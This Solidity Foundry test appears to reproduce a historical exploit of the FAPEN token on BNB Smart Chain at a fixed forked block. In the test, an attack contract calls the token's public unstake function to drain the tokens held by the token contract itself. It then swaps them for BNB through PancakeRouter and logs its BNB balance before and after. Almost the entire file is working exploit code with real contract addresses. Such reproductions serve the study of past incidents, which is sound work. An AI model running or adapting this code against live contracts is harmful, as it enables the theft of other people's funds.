// SPDX-License-Identifier: Apache
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function unstake(uint256 amount) external;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Burn(address indexed burner, uint256 value);
}

interface IPancakeRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Fapen is Test {
    IERC20 FAPEN = IERC20(0xf3F1aBae8BfeCA054B330C379794A7bf84988228);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter Router =
        IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 28637846);
    }

    function testFapenExploit() external {
        vm.deal(address(this), 0 ether);
        emit log_named_decimal_uint(
            "Balance of FAPEN in FAPEN Contract",
            FAPEN.balanceOf(address(FAPEN)),
            9
        );
       emit log_named_decimal_uint(
            "Balance of BNB in Attack Contract",
            address(this).balance,
            18
        );
        uint amount = FAPEN.balanceOf(address(FAPEN));
        FAPEN.unstake(amount);
        FAPEN.approve(address(Router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(FAPEN);
        path[1] = address(WBNB);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount,0,path,address(this),block.timestamp + 1000);

        emit log_named_decimal_uint(
            "Balance of BNB in Attack Contract",
            address(this).balance,
            18
        );
    }
    receive() external payable {}
}
